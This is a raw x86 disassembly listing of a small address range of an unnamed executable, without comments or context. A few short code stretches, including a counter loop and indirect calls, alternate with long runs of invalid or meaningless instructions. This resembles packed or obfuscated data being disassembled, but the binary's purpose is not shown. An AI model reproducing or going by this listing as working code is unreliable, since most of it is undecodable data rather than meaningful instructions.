  4083b3:	or     edx,DWORD PTR [eax]
  4083b5:	ja     0x408412
  4083b7:	gs dec ebx
  4083b9:	loop   0x4083fa
  4083bb:	xchg   esi,eax
  4083bc:	ja     0x408398
  4083be:	push   ecx
  4083bf:	inc    esi
  4083c0:	fcomi  st,st(4)
  4083c2:	retf   
  4083c3:	sahf   
  4083c4:	mov    DWORD PTR [ebp-0x20],eax
  4083c7:	and    DWORD PTR ds:0x43365b,0x0
  4083d1:	mov    eax,ds:0x43365b
  4083d6:	inc    eax
  4083d7:	mov    ds:0x43365b,eax
  4083dc:	cmp    DWORD PTR ds:0x43365b,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x43365b,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x43365b
  40840c:	inc    eax
  40840d:	mov    ds:0x43365b,eax
  408412:	cmp    DWORD PTR ds:0x43365b,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43360b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433613,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x433727
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	xor    ebp,0xc8e492f4
  40846a:	jle    0x4084ea
  40846c:	and    al,0x7c
  40846e:	jle    0x4084ee
  408470:	mov    eax,0xb64c81e8
  408475:	xor    ch,BYTE PTR [esp+edi*4+0x5c]
  408479:	sub    cl,BYTE PTR [esi+0x4b37a3b6]
  40847f:	std    
  408480:	out    dx,al
  408481:	sub    ebx,DWORD PTR [edi-0x35]
  408484:	les    ebx,FWORD PTR [ebx-0x6f]
  408487:	sub    DWORD PTR [eax],ebp
  408489:	dec    esp
  40848a:	lds    edi,FWORD PTR [ecx]
  40848c:	aaa    
  40848d:	jns    0x4084ae
  40848f:	add    eax,0x19c23169
  408494:	push   ds
  408495:	(bad)  
  408496:	iret   
  408497:	xchg   edi,eax
  408498:	jnp    0x4084e1
  40849a:	add    eax,0x83835d60
  40849f:	mov    ah,0xab
  4084a1:	sbb    eax,DWORD PTR [ecx+edx*8-0x4a8be1f7]
  4084a8:	mov    ecx,0xfa79603c
  4084ad:	data16 sub dl,BYTE PTR [esi]
  4084b0:	xchg   esp,eax
  4084b1:	hlt    
  4084b2:	es jl  0x4084ac
  4084b5:	ret    
  4084b6:	fmulp  st(6),st
  4084b8:	mov    BYTE PTR [ebx],bl
  4084ba:	lea    esp,[ecx+0x6d]
  4084bd:	and    al,0x85
  4084bf:	xor    al,0x86
  4084c1:	mov    esp,0x38906559
  4084c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084c7:	ja     0x408477
  4084c9:	popf   
  4084ca:	push   ss
  4084cb:	jae    0x40848b
  4084cd:	and    bl,cl
  4084cf:	sahf   
  4084d0:	or     BYTE PTR [edi+0xd893182],0xee
  4084d7:	add    al,0x3
  4084d9:	aas    
  4084da:	enter  0xa785,0x68
  4084de:	rol    BYTE PTR [edi+esi*4],0xdb
  4084e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084e3:	adc    eax,0x580a5ccf
  4084e8:	push   ds
  4084e9:	pop    edi
  4084ea:	sub    bh,ah
  4084ec:	inc    eax
  4084ed:	mov    edx,0x970098f7
  4084f2:	pusha  
  4084f3:	aaa    
  4084f4:	jp     0x40853a
  4084f6:	mov    bl,0xc1
  4084f8:	mov    bh,0x17
  4084fa:	jmp    0xf5fd:0x9af56a72
  408501:	mov    edi,0x94b360d0
  408506:	mov    dl,0x76
  408508:	daa    
  408509:	mov    esp,0xf813e4e7
  40850e:	fcmovnb st,st(4)
  408510:	data16 jb 0x408574
  408513:	pop    ebx
  408514:	cs jl  0x408531
  408517:	rol    DWORD PTR [edx],0x2b
  40851a:	fchs   
  40851c:	adc    DWORD PTR [ecx+0x53],ebx
  40851f:	outs   dx,BYTE PTR ds:[esi]
  408520:	push   ss
  408521:	pop    edi
  408522:	jle    0x4084e7
  408524:	fadd   DWORD PTR [edx-0x61ba473a]
  40852a:	sbb    dh,ah
  40852c:	cdq    
  40852d:	stos   DWORD PTR es:[edi],eax
  40852e:	stos   DWORD PTR es:[edi],eax
  40852f:	popa   
  408530:	(bad)  
  408531:	xor    bh,BYTE PTR [ebx+0x14ec44fc]
  408537:	xchg   ebp,eax
  408538:	add    al,0x3e
  40853a:	cmp    al,BYTE PTR [ebx-0x316ab3ff]
  408540:	leave  
  408541:	ret    0x78c1
  408544:	add    ebx,DWORD PTR [ebp+0x19]
  408547:	push   eax
  408548:	mov    cl,0x5f
  40854a:	mov    edi,0x9f6164cc
  40854f:	mov    cs,WORD PTR [edi-0x22]
  408552:	aam    0x40
  408554:	add    dl,BYTE PTR [eax]
  408556:	out    dx,eax
  408557:	es aaa 
  408559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40855a:	cmp    cl,BYTE PTR [ebx]
  40855c:	rcr    DWORD PTR [eax-0x5fa7b17a],1
  408562:	clc    
  408563:	test   BYTE PTR [ebx+0x71a94ac8],dl
  408569:	(bad)  
  40856a:	and    ah,bl
  40856c:	int3   
  40856d:	jno    0x408561
  40856f:	mov    eax,ds:0x1f52c2e0
  408574:	push   eax
  408575:	sub    bl,BYTE PTR [eax-0x2c]
  408578:	fistp  QWORD PTR [edx+0x49a13dac]
  40857e:	popa   
  40857f:	adc    al,0x27
  408581:	int    0xe0
  408583:	hlt    
  408584:	cli    
  408585:	(bad)  
  408586:	pop    esp
  408587:	xchg   edx,eax
  408588:	out    0x2d,eax
  40858a:	ins    BYTE PTR es:[edi],dx
  40858b:	add    ch,dl
  40858d:	ror    DWORD PTR ds:[ebx],0x86
  408591:	test   eax,0x4ac2a28a
  408596:	adc    eax,0x55ec2f32
  40859b:	dec    DWORD PTR [ebx-0x4e3ef79c]
  4085a1:	stc    
  4085a2:	dec    eax
  4085a3:	gs out dx,eax
  4085a5:	je     0x408622
  4085a7:	inc    edi
  4085a8:	mov    ecx,0xcc37f47
  4085ad:	ret    
  4085ae:	scas   al,BYTE PTR es:[edi]
  4085af:	js     0x408581
  4085b1:	retf   
  4085b2:	fsub   st,st(6)
  4085b4:	unpckhps xmm3,XMMWORD PTR [eax]
  4085b7:	push   ebp
  4085b8:	sub    ebp,DWORD PTR [edx+0x32]
  4085bb:	stc    
  4085bc:	fcomp  QWORD PTR [eax+esi*1+0x21e58b3]
  4085c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085c4:	pop    esp
  4085c5:	aad    0x12
  4085c7:	mov    dl,0xa1
  4085c9:	imul   edx,DWORD PTR [edi+0x52],0xffffffdb
  4085cd:	adc    DWORD PTR [ebx],eax
  4085cf:	xor    eax,0xcf795746
  4085d4:	xchg   BYTE PTR [esi],dl
  4085d6:	fistp  DWORD PTR [ecx+0x5b]
  4085d9:	xor    BYTE PTR [edi],bh
  4085db:	cld    
  4085dc:	arpl   WORD PTR [ebx-0x47],dx
  4085df:	(bad)  
  4085e0:	cs xchg edi,eax
  4085e2:	rcr    DWORD PTR [ecx],cl
  4085e4:	ins    BYTE PTR es:[edi],dx
  4085e5:	mov    DWORD PTR [ebx-0x3e4c2d99],0x431e7142
  4085ef:	dec    edi
  4085f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085f1:	add    BYTE PTR [edi],bh
  4085f3:	dec    DWORD PTR [edi+0x4a]
  4085f6:	test   esp,eax
  4085f8:	cs sbb al,0xbd
  4085fb:	ds fwait
  4085fd:	push   ds
  4085fe:	lods   eax,DWORD PTR ds:[esi]
  4085ff:	mov    eax,ds:0x3335914a
  408604:	xchg   BYTE PTR [ebp-0x4b],bl
  408607:	xchg   edi,eax
  408608:	cmp    eax,0x3a899695
  40860d:	fiadd  DWORD PTR [ebp*2+0x5e71a43c]
  408614:	xchg   esp,eax
  408615:	icebp  
  408616:	(bad)  [edx-0x47]
  408619:	add    eax,0xf096ac61
  40861e:	ins    DWORD PTR es:[edi],dx
  40861f:	(bad)  
  408620:	(bad)  
  408621:	aas    
  408622:	stos   DWORD PTR es:[edi],eax
  408623:	jb     0x40863e
  408625:	jbe    0x4085d3
  408627:	(bad)  
  408628:	xchg   esp,eax
  408629:	popf   
  40862a:	push   0xffffffb2
  40862c:	pop    edx
  40862d:	sbb    bh,BYTE PTR ds:0xc5fdc288
  408633:	add    eax,0xb623d0ec
  408638:	push   ss
  408639:	daa    
  40863a:	shl    DWORD PTR [edx+0x4e],0x9e
  40863e:	jbe    0x4085e7
  408640:	xlat   BYTE PTR ds:[ebx]
  408641:	mov    eax,ds:0x25b6dd3f
  408646:	mov    esp,0xd0de3401
  40864b:	cdq    
  40864c:	lahf   
  40864d:	out    dx,eax
  40864e:	cld    
  40864f:	and    al,0x97
  408651:	mov    bh,0x9e
  408653:	in     al,dx
  408654:	and    al,0x87
  408656:	ror    DWORD PTR [ebp-0x8543eac],0x16
  40865d:	mov    edi,0x330e14de
  408662:	or     eax,0x52a5317e
  408667:	mov    bh,0xab
  408669:	loop   0x4085f1
  40866b:	fucomp st(3)
  40866d:	ins    DWORD PTR es:[edi],dx
  40866e:	(bad)  [ebx+0x10]
  408671:	pop    esp
  408672:	mov    ds:0x62684b7d,al
  408677:	sbb    eax,0xa7a78c94
  40867c:	repnz lahf 
  40867e:	sbb    BYTE PTR [ebp-0x77],bl
  408681:	ret    
  408682:	retf   
  408683:	sti    
  408684:	ins    BYTE PTR es:[edi],dx
  408685:	scas   eax,DWORD PTR es:[edi]
  408686:	mov    edi,0x55d2dca7
  40868b:	pop    ebx
  40868c:	rcl    BYTE PTR [edx],cl
  40868e:	mov    dl,0x63
  408690:	popa   
  408691:	add    edx,DWORD PTR [ecx]
  408693:	lds    ecx,FWORD PTR [edx+0x56f39f14]
  408699:	xchg   DWORD PTR [ebx-0x71ed0148],edi
  40869f:	adc    DWORD PTR ds:0x433663,0x4335fb
  4086a9:	mov    DWORD PTR [ebp-0xc],ebx
  4086ac:	sbb    DWORD PTR ds:0x4336ef,0x433727
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx+0x66086d4a],ecx
  4086ca:	arpl   WORD PTR [edx+0x247e7ed6],cx
  4086d0:	jl     0x408750
  4086d2:	jle    0x40866a
  4086d4:	pop    edx
  4086d5:	adc    al,0x16
  4086d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086d8:	cdq    
  4086d9:	sbb    cl,dh
  4086db:	int    0xae
  4086dd:	dec    edi
  4086de:	test   BYTE PTR [ebp-0xe],0x69
  4086e2:	xchg   edx,eax
  4086e3:	cmp    al,0x9f
  4086e5:	fidivr DWORD PTR [edi+0x21a99f3e]
  4086eb:	fs js  0x408745
  4086ee:	mov    ecx,ss
  4086f0:	std    
  4086f1:	mov    ebp,0xe965af62
  4086f6:	cli    
  4086f7:	rol    BYTE PTR [ebx-0x42],cl
  4086fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086fb:	ror    DWORD PTR [ecx+0x6458013b],1
  408701:	int3   
  408702:	stc    
  408703:	ds jb  0x4086e4
  408706:	jl     0x4086e7
  408708:	(bad)  
  408709:	and    DWORD PTR [edi+0x3f],eax
  40870c:	sub    BYTE PTR [edx+0x65ac07e3],ch
  408712:	enter  0xbfe8,0x3
  408716:	xlat   BYTE PTR ds:[ebx]
  408717:	pop    esi
  408718:	adc    BYTE PTR [esi+0x69cb3909],dh
  40871e:	jno    0x4086ae
  408720:	cmp    al,0x95
  408722:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408723:	mov    ebx,0x7d746fc8
  408728:	ins    BYTE PTR es:[edi],dx
  408729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40872a:	sbb    eax,0x311e937
  40872f:	sahf   
  408730:	dec    edi
  408731:	mov    edi,0x35b9c3c1
  408736:	push   ebp
  408737:	sbb    al,0xbe
  408739:	int3   
  40873a:	sbb    BYTE PTR [edx-0x31],ch
  40873d:	stc    
  40873e:	icebp  
  40873f:	jno    0x408734
  408741:	mov    ds:0x229230b9,eax
  408746:	sbb    al,0x34
  408748:	iret   
  408749:	mov    edx,0xdb78227f
  40874e:	mul    DWORD PTR [edi]
  408750:	push   edi
  408751:	xchg   DWORD PTR [ecx-0xf],ebx
  408754:	(bad)  
  408755:	sti    
  408756:	retf   
  408757:	sahf   
  408758:	xchg   BYTE PTR [edx+0x20dada3d],cl
  40875e:	jge    0x40871a
  408760:	xchg   edi,eax
  408761:	repz push esp
  408763:	inc    eax
  408764:	out    dx,al
  408765:	push   esp
  408766:	mov    WORD PTR [edi],fs
  408768:	or     BYTE PTR [edi+0xa],ch
  40876b:	mov    dl,0xd1
  40876d:	les    edi,FWORD PTR [edi-0x34]
  408770:	aaa    
  408771:	push   esi
  408772:	lock pop esp
  408774:	sti    
  408775:	mov    ds:0x988bdf51,al
  40877a:	in     al,0x5e
  40877c:	push   esi
  40877e:	sub    esp,edx
  408780:	in     al,dx
  408781:	mov    edx,DWORD PTR [edx-0x1d]
  408784:	repz out 0x9a,eax
  408787:	call   0x1bbeb64a
  40878c:	dec    ebx
  40878d:	out    0x1a,al
  40878f:	push   ebp
  408790:	les    ebx,FWORD PTR [edx-0x7d285b7a]
  408796:	dec    ecx
  408797:	int    0xc2
  408799:	mov    ebp,0x78a44a32
  40879e:	push   es
  40879f:	les    esp,FWORD PTR [edi-0x5c840369]
  4087a5:	arpl   WORD PTR [ebp+0x6e4b7278],bp
  4087ab:	push   ebx
  4087ac:	call   FWORD PTR [esi-0x7b]
  4087af:	inc    ebx
  4087b0:	stos   BYTE PTR es:[edi],al
  4087b1:	int    0xa2
  4087b3:	outs   dx,BYTE PTR ds:[esi]
  4087b4:	pushf  
  4087b5:	lds    ebp,FWORD PTR ds:0xcb9036d5
  4087bb:	jmp    0x985c:0x5dfe0732
  4087c2:	retf   0xd83f
  4087c5:	and    eax,0x4d43282e
  4087ca:	or     ah,al
  4087cc:	cmp    ebp,edx
  4087ce:	popf   
  4087cf:	leave  
  4087d0:	dec    esp
  4087d1:	fcom   QWORD PTR [ecx]
  4087d3:	aad    0x7b
  4087d5:	jp     0x40881a
  4087d7:	rol    dh,cl
  4087d9:	jge    0x4087d6
  4087db:	and    dh,ah
  4087dd:	pop    esi
  4087de:	mov    ds:0x86dc999f,eax
  4087e3:	(bad)  
  4087e4:	test   eax,0xad97438
  4087e9:	xor    al,0xbc
  4087eb:	fs pop edx
  4087ed:	sub    bh,BYTE PTR [ecx+ebx*8+0x2f]
  4087f1:	dec    ecx
  4087f2:	ja     0x408855
  4087f4:	ins    BYTE PTR es:[edi],dx
  4087f5:	cmp    al,0xe
  4087f7:	mov    esi,0x996c1ec8
  4087fc:	inc    ebx
  4087fd:	out    0xf7,eax
  4087ff:	int    0xe3
  408801:	inc    edi
  408802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408803:	mov    esi,0x4540083
  408808:	xor    BYTE PTR [ecx+0x68afee5d],0xf6
  40880f:	cmp    dh,dl
  408811:	xchg   edi,eax
  408812:	mov    dl,0x8
  408814:	test   eax,0xff189154
  408819:	cmp    ebp,DWORD PTR [edx]
  40881b:	add    al,0x46
  40881d:	test   al,0x81
  40881f:	(bad)
  408822:	dec    edi
  408823:	and    DWORD PTR [eax-0x1d9f26e6],ebx
  408829:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40882a:	imul   edi,eax,0xe1a60500
  408830:	scas   eax,DWORD PTR es:[edi]
  408831:	pop    esp
  408832:	mov    ah,0x8e
  408834:	retf   
  408835:	push   0xffffffab
  408837:	or     eax,0xb05413db
  40883c:	sub    al,0xb9
  40883e:	out    0xe7,al
  408840:	push   es
  408841:	cmp    eax,0xeac4126a
  408846:	call   DWORD PTR [esi+esi*1+0x615a336d]
  40884d:	mov    esp,0xb057b3a3
  408852:	loope  0x40883d
  408854:	(bad)  
  408855:	test   al,0x25
  408857:	push   edx
  408858:	loope  0x408812
  40885a:	jo     0x408807
  40885c:	inc    ebp
  40885d:	mov    ah,ch
  40885f:	xor    dl,BYTE PTR [eax]
  408861:	pop    ecx
  408862:	pop    edx
  408863:	aam    0x10
  408865:	call   0x6af91869
  40886a:	fisttp DWORD PTR ds:0x213483cf
  408870:	out    dx,eax
  408871:	daa    
  408872:	xor    DWORD PTR [ecx],edx
  408874:	xchg   ebp,eax
  408875:	scas   al,BYTE PTR es:[edi]
  408876:	into   
  408877:	mov    ds:0xef0173,eax
  40887c:	mov    bh,0xf2
  40887e:	ret    
  40887f:	pop    ecx
  408880:	jp     0x4088fa
  408882:	fstp   DWORD PTR [edi]
  408884:	inc    ecx
  408885:	push   es
  408886:	es jecxz 0x408827
  408889:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40888a:	push   ecx
  40888b:	cmp    edx,DWORD PTR [ebx-0x1f53296f]
  408891:	sbb    al,0x40
  408893:	out    0x29,al
  408895:	inc    eax
  408896:	jae    0x4088c1
  408898:	xchg   ebp,eax
  408899:	sbb    BYTE PTR [ebp+0x443c6664],cl
  40889f:	pop    eax
  4088a0:	mov    ebp,0xd1d05476
  4088a5:	int    0xbe
  4088a7:	add    BYTE PTR [edi-0xbadc431],dl
  4088ad:	add    BYTE PTR [esp+edi*2],dl
  4088b0:	cmp    eax,0xa63350ee
  4088b5:	lahf   
  4088b6:	(bad)  
  4088b7:	js     0x4088e5
  4088b9:	sar    DWORD PTR [edi+0x2d44df73],cl
  4088bf:	sbb    BYTE PTR [ebp-0x1d],ch
  4088c2:	fnstcw WORD PTR [edi+0x4f]
  4088c5:	xor    dl,BYTE PTR [edx+0x69f57470]
  4088cb:	xchg   ebp,eax
  4088cc:	adc    dl,BYTE PTR ds:0x799b5404
  4088d2:	lea    edi,[ebx+0x24]
  4088d5:	mov    dh,0xdf
  4088d8:	retf   0xde08
  4088db:	aaa    
  4088dc:	ret    0xe8d8
  4088df:	sub    eax,0xb0462dd7
  4088e4:	push   esp
  4088e5:	sbb    al,0x4
  4088e7:	pop    eax
  4088e8:	push   esi
  4088e9:	jnp    0x4088b4
  4088eb:	xchg   esi,eax
  4088ec:	xchg   bh,al
  4088ee:	adc    eax,0x6e6a64e5
  4088f3:	sub    DWORD PTR [ebx-0x79],edi
  4088f6:	inc    esp
  4088f7:	pop    esp
  4088f8:	jo     0x4088d4
  4088fa:	mov    ah,BYTE PTR [ecx-0x7eff74f4]
  408900:	xor    eax,0x433663
  408905:	sub    bh,BYTE PTR [eax+eax*1+0x0]
  408909:	mov    cx,WORD PTR [ebp-0x4]
  40890d:	adc    DWORD PTR ds:0x4336db,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x433653,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43361f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x433727,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0x64e5132c
  408968:	enter  0xd4b0,0x7e
  40896c:	jle    0x408992
  40896e:	jl     0x4089ee
  408970:	jle    0x4089af
  408972:	mov    edx,cs
  408974:	(bad)  
  408975:	adc    DWORD PTR [edx+0x21],0x72
  408979:	and    ebx,ebp
  40897b:	jns    0x40898e
  40897d:	dec    ebp
  40897e:	fnstenv [edi]
  408980:	fs and al,0x5c
  408983:	pop    es
  408984:	and    dh,dl
  408986:	sbb    esp,DWORD PTR [ebp+0x5733d4ad]
  40898c:	add    eax,0x40cf23c1
  408991:	neg    al
  408993:	mov    gs,WORD PTR [eax-0x2bdba645]
  408999:	inc    ecx
  40899a:	cmc    
  40899b:	push   esi
  40899c:	xchg   ecx,eax
  40899d:	ret    
  40899e:	fsub   DWORD PTR [ebx+0x5c]
  4089a1:	popa   
  4089a2:	call   0xadd:0xf06c89a3
  4089a9:	inc    edx
  4089aa:	retf   
  4089ab:	mov    ds:0xeab4931a,eax
  4089b0:	jns    0x4089b1
  4089b2:	pop    eax
  4089b3:	cmp    dh,BYTE PTR [eax+edx*8+0x39]
  4089b7:	mov    esp,edx
  4089b9:	test   DWORD PTR [esi-0x1bd63cea],edi
  4089bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089c0:	cmp    DWORD PTR [esi],edx
  4089c2:	loopne 0x408979
  4089c4:	sbb    DWORD PTR [ebx],esp
  4089c6:	or     esi,DWORD PTR [ebx+0x4b]
  4089c9:	adc    esi,ebp
  4089cb:	push   0xb58393d5
  4089d0:	aas    
  4089d1:	add    dh,BYTE PTR [ecx-0x2079ad91]
  4089d7:	pop    ss
  4089d8:	call   0xac16655c
  4089dd:	mov    ds:0xfe04f1d0,al
  4089e2:	je     0x408a42
  4089e4:	daa    
  4089e5:	jmp    esi
  4089e7:	outs   dx,DWORD PTR fs:[esi]
  4089e9:	mov    dl,0xcf
  4089eb:	jp     0x4089be
  4089ed:	loopne 0x40898f
  4089ef:	dec    esi
  4089f0:	stos   DWORD PTR es:[edi],eax
  4089f1:	loop   0x408a5d
  4089f3:	mov    DWORD PTR [edi+0xba85b6b],edx
  4089f9:	(bad)  
  4089fa:	into   
  4089fb:	stc    
  4089fc:	mov    ebp,0xae176f07
  408a01:	inc    ebp
  408a02:	icebp  
  408a03:	mov    ebp,0x8fc5625c
  408a08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a09:	int3   
  408a0a:	pusha  
  408a0b:	pop    eax
  408a0c:	push   cs
  408a0d:	bound  esp,QWORD PTR [ecx+edi*4]
  408a10:	jmp    0x4089b5
  408a12:	ret    
  408a13:	xchg   esi,eax
  408a14:	mov    ebp,0x537553c8
  408a19:	sbb    edx,DWORD PTR [edi-0x587c57e5]
  408a1f:	int3   
  408a20:	jne    0x4089b3
  408a22:	xor    esi,DWORD PTR ds:0x32e04ef
  408a28:	int3   
  408a29:	xchg   ecx,eax
  408a2a:	jmp    0x4089ef
  408a2c:	cdq    
  408a2d:	jno    0x408a31
  408a2f:	lea    esi,[edi-0x59]
  408a32:	add    DWORD PTR [ebx+edi*2],0x3
  408a36:	pop    edi
  408a37:	sub    ecx,DWORD PTR [esi]
  408a39:	ror    esi,1
  408a3b:	xchg   edi,eax
  408a3c:	cmp    ebp,esi
  408a3e:	and    bh,BYTE PTR [edi+0x7b]
  408a41:	inc    edx
  408a42:	call   0x64e56a23
  408a47:	fucomip st,st(6)
  408a49:	jbe    0x4089e2
  408a4b:	xor    bh,0xb9
  408a4e:	shr    BYTE PTR [ebp-0x237d0ff9],1
  408a54:	adc    BYTE PTR [eax-0x6c],bl
  408a57:	xor    edi,DWORD PTR [ecx+0x2454c684]
  408a5d:	xchg   bh,bl
  408a5f:	mov    eax,ds:0x8c5e492f
  408a64:	adc    eax,0xda9a4395
  408a69:	push   ds
  408a6a:	or     DWORD PTR fs:[edx-0x61],edi
  408a6e:	cmp    al,0xb1
  408a70:	add    BYTE PTR [ecx-0x7f52d85],bh
  408a76:	jp     0x408a0b
  408a78:	fisttp QWORD PTR [ebx+0xc]
  408a7b:	jno    0x408a68
  408a7d:	pop    ecx
  408a7e:	fs pop ebx
  408a80:	sbb    DWORD PTR [esi-0x56729839],ecx
  408a86:	pop    esi
  408a87:	push   ds
  408a88:	mov    al,BYTE PTR [esp+ebx*4]
  408a8b:	arpl   si,dx
  408a8d:	imul   ebx,eax,0xffffff81
  408a90:	inc    esp
  408a91:	(bad)  
  408a92:	fsubr  QWORD PTR [ecx+0x52]
  408a95:	(bad)  
  408a96:	bound  edx,QWORD PTR [ebp+0x2e5d0039]
  408a9c:	push   ss
  408a9d:	test   al,0xb3
  408a9f:	test   DWORD PTR [ebx+ecx*2-0x58],0x4bf3cef
  408aa7:	aas    
  408aa8:	jmp    0x2b8d:0xdcd3cbda
  408aaf:	push   0xeb3eeb6f
  408ab4:	push   eax
  408ab5:	sub    cl,al
  408ab7:	jl     0x408a4a
  408ab9:	les    ebp,FWORD PTR [eax+edx*1-0x33]
  408abd:	test   eax,0xc734cb27
  408ac2:	jp     0x408b22
  408ac4:	or     esi,0xfffffff7
  408ac7:	(bad)  
  408ac8:	enter  0x6650,0x75
  408acc:	shl    DWORD PTR [esi+0x655aea23],1
  408ad2:	sub    BYTE PTR [eax+esi*4+0x8],ch
  408ad6:	pop    ss
  408ad7:	xchg   esi,edi
  408ad9:	dec    ecx
  408ada:	iret   
  408adb:	(bad)  
  408adc:	mov    ds:0x6d1d9b27,eax
  408ae1:	sbb    eax,0x2601024e
  408ae6:	test   al,0x3e
  408ae8:	inc    esi
  408ae9:	and    al,0x64
  408aeb:	mov    edi,0x8b63c6a0
  408af0:	and    eax,0x49178b49
  408af5:	cmp    ebx,esi
  408af7:	retf   
  408af8:	sub    ah,BYTE PTR [eax]
  408afa:	pop    edx
  408afb:	in     al,0x2c
  408afd:	xor    DWORD PTR [ebx],ebp
  408aff:	cmp    eax,0xd3e465a3
  408b04:	xchg   edx,eax
  408b05:	lock and edx,0x74
  408b09:	fsub   DWORD PTR [ecx]
  408b0b:	fiadd  DWORD PTR [edi+0x5232e3e7]
  408b11:	sub    eax,0x490af179
  408b16:	dec    ebp
  408b17:	call   0x207b:0xa55254ec
  408b1e:	and    eax,0x42fd5ce7
  408b23:	mov    eax,ds:0x24d1d2ba
  408b28:	lahf   
  408b29:	imul   edx,DWORD PTR [ecx+0x7b8cc417],0xffffffab
  408b30:	or     ch,ch
  408b32:	sar    BYTE PTR [ebx+0x389ce1b1],0xd2
  408b39:	sbb    DWORD PTR [ecx+eax*8],edi
  408b3c:	dec    edx
  408b3d:	adc    BYTE PTR [ebx+eax*1+0x51b1f243],dl
  408b44:	jp     0x408b72
  408b46:	push   ecx
  408b47:	dec    ebp
  408b48:	jno    0x408b3b
  408b4a:	clc    
  408b4b:	shl    DWORD PTR [ecx-0x16],cl
  408b4e:	xor    edi,ecx
  408b50:	fld    TBYTE PTR [ebx-0x7e]
  408b53:	gs sti 
  408b55:	mov    al,ds:0xdd60a231
  408b5a:	adc    BYTE PTR [edi+ebx*2-0x33ac86af],cl
  408b61:	mov    DWORD PTR [edx+0x3140c98c],eax
  408b67:	mov    eax,ds:0xc9ce7bae
  408b6c:	jl     0x408b31
  408b6e:	imul   edi,DWORD PTR [esi+0x299f0d5e],0x74
  408b75:	ins    DWORD PTR es:[edi],dx
  408b76:	push   esp
  408b77:	loope  0x408b26
  408b79:	jmp    0xfe0bb451
  408b7e:	mov    BYTE PTR [eax-0x6f408bc1],0x61
  408b85:	mov    ebx,0x1256f91d
  408b8a:	sbb    BYTE PTR [ebx],0x8d
  408b8d:	(bad)  
  408b8e:	shl    DWORD PTR [edx+0x52],1
  408b91:	nop
  408b92:	lea    esi,[ecx+esi*1+0x1d3b7251]
  408b99:	add    esi,DWORD PTR [ecx]
  408b9b:	jne    0x408bbe
  408ba1:	mov    eax,DWORD PTR [ebp+0x8]
  408ba4:	mov    ecx,DWORD PTR [ebp-0x10]
  408ba7:	xor    eax,esi
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	ins    BYTE PTR es:[edi],dx
  408bf1:	mov    BYTE PTR [ebx+ecx*1+0x66],al
  408bf5:	sar    BYTE PTR [esi+0x7e],cl
  408bf8:	and    al,0x7c
